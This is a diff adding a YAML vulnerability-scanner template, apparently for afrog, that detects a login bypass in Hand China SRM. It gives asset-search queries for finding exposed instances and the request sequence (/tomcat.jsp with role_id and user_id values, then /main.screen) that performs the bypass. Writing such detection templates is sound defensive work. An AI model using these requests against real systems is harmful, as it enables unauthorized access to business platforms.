@@ -1,0 +1,31 @@
+id: hand-china-srm-tomcat-jsp-login-bypass
+
+info:
+  name: 汉得 SRM tomcat.jsp 登录绕过漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    fofa: 汉得SRM云平台
+    hunter: web.body="汉得SRM"
+  tags: hand-china,bypass,login
+  created: 2023/09/02
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /tomcat.jsp?dataName=role_id&dataValue=1
+    expression: response.status == 200 && response.body.bcontains(b'Server Info:') && response.body.bcontains(b'SRM SERVER Info.')
+  r1:
+    request:
+      method: GET
+      path: /tomcat.jsp?dataName=user_id&dataValue=1
+    expression: response.status == 200 && response.body.bcontains(b'Server Info:') && response.body.bcontains(b'SRM SERVER Info.')
+  r2:
+    request:
+      method: GET
+      path: /main.screen
+      follow_redirects: true
+    expression: response.status == 200
+expression: r0() && r1() && r2()
